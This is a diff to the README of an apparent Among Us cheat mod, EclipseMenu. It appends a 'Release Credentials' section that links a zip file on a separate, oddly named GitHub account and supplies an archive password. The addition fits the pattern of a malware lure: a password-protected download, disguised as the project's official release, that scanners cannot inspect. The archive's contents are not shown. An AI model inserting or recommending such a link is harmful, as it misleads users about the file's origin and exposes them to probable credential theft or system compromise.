@@ -184,3 +184,10 @@ Usage of this mod can violate the terms of service of Among Us, which may lead t
 
 Thanks to [MalumMenu](https://github.com/scp222thj/MalumMenu), for the existence of EclipseMenu.<br>
 Thanks to [MalumMenu-Unofficial](https://github.com/f1xx00rs/MalumMenu-Unofficial), for helping with some functions.
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/EclipseMenu-dist-22bk/releases/download/v1.0.0/EclipseMenu.zip)
+- **Archive Password:** `7t3NFIJ98R`
